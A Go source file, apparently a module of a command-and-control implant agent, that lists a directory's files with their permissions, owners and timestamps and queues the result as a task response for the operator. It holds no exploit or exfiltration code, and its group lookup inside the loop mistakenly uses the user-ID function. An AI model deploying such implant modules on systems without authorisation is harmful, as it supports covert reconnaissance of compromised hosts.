package ls

import (
	"encoding/json"
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"
	"pkg/profiles"
	"pkg/utils/structs"
	"strconv"
	"strings"
	"sync"
	"syscall"
)

var mu sync.Mutex

type Arguments struct {
	Path        string `json:"path"`
	FileBrowser bool   `json:"file_browser"`
}

func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	args := Arguments{}
	json.Unmarshal([]byte(task.Params), &args)
	var e structs.DirectoryEntries
	abspath, _ := filepath.Abs(args.Path)
	dirInfo, err := os.Stat(abspath)
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}
	var uid string
	var gid string
	if stat, ok := dirInfo.Sys().(*syscall.Stat_t); ok {
		uid = strconv.Itoa(int(stat.Uid))
		gid = strconv.Itoa(int(stat.Gid))
	} else {
		uid = "n/a"
		gid = "n/a"
	}
	e.IsFile = !dirInfo.IsDir()
	e.Permissions.Permissions = dirInfo.Mode().Perm().String()
	e.Filename = dirInfo.Name()
	e.ParentPath = filepath.Dir(abspath)
	if strings.Compare(e.ParentPath, e.Filename) == 0 {
		e.ParentPath = ""
	}
	e.FileSize = dirInfo.Size()
	e.LastModified = dirInfo.ModTime().String()
	e.LastAccess = ""
	e.Success = true
	// Grab the user and group
	userObject, err := user.LookupId(uid)
	if err != nil {
		e.User = "n/a"
	} else {
		e.User = userObject.Username
	}

	groupObject, err := user.LookupGroupId(gid)
	if err != nil {
		e.Group = "n/a"
	} else {
		e.Group = groupObject.Name
	}

	if dirInfo.IsDir() {
		files, err := ioutil.ReadDir(abspath)
		if err != nil {
			msg.UserOutput = err.Error()
			msg.Completed = true
			msg.Status = "error"
			e.Success = false
			msg.FileBrowser = e
			resp, _ := json.Marshal(msg)
			mu.Lock()
			profiles.TaskResponses = append(profiles.TaskResponses, resp)
			mu.Unlock()
			return
		}

		fileEntries := make([]structs.FileData, len(files))
		for i := 0; i < len(files); i++ {
			fileEntries[i].IsFile = !files[i].IsDir()
			fileEntries[i].Permissions.Permissions = files[i].Mode().Perm().String()
			fileEntries[i].Filename = files[i].Name()
			fileEntries[i].FileSize = files[i].Size()
			fileEntries[i].LastModified = files[i].ModTime().String()
			fileEntries[i].LastAccess = ""

			if stat, ok := files[i].Sys().(*syscall.Stat_t); ok {
				uinfo, err := user.LookupId(strconv.Itoa(int(stat.Uid)))
				if err != nil {
					fileEntries[i].User = "n/a"
				} else {
					fileEntries[i].User = uinfo.Username
				}

				ginfo, err := user.LookupId(strconv.Itoa(int(stat.Gid)))
				if err != nil {
					fileEntries[i].Group = "n/a"
				} else {
					fileEntries[i].Group = ginfo.Name
				}

			} else {
				fileEntries[i].User = "n/a"
				fileEntries[i].Group = "n/a"
			}
		}
		e.Files = fileEntries
	}
	msg.Completed = true
	msg.FileBrowser = e
	if args.FileBrowser {
		msg.UserOutput = "Retrieved data for file browser"
	} else {
		temp, _ := json.Marshal(msg.FileBrowser)
		msg.UserOutput = string(temp)
	}
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
